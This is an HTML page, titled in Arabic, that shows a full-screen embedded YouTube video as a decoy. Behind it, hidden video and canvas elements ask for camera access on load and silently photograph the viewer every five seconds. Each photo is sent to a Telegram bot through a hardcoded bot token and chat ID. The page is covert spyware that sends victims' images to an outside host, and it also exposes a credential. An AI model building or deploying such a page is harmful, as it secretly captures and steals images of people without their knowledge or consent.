<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>فيديو + تصوير تلقائي</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      height: 100%;
    }
    iframe {
      width: 100vw;
      height: 100vh;
      border: none;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

  <!-- عناصر الكاميرا -->
  <video id="video" autoplay playsinline width="320" height="240"></video>
  <canvas id="canvas" width="320" height="240"></canvas>

  <!-- تشغيل الفيديو الجديد -->
  <iframe
    src="https://www.youtube.com/embed/9ztHbf0hyEw"
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
    allowfullscreen>
  </iframe>

  <script>
    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
    const CHAT_ID = '6036900535';

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const context = canvas.getContext("2d");

    async function sendToTelegram(base64Image) {
      try {
        const blob = await (await fetch(base64Image)).blob();
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "image.png");

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });
        console.log("✅ تم إرسال صورة");
      } catch (err) {
        console.error("❌ فشل الإرسال", err);
      }
    }

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        setInterval(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/png");
          sendToTelegram(imageData);
        }, 5000); // كل 5 ثواني

      } catch (error) {
        alert("🚫 فشل تشغيل الكاميرا: " + error.message);
        console.error(error);
      }
    }

    window.onload = startCamera;
  </script>
</body>
</html>
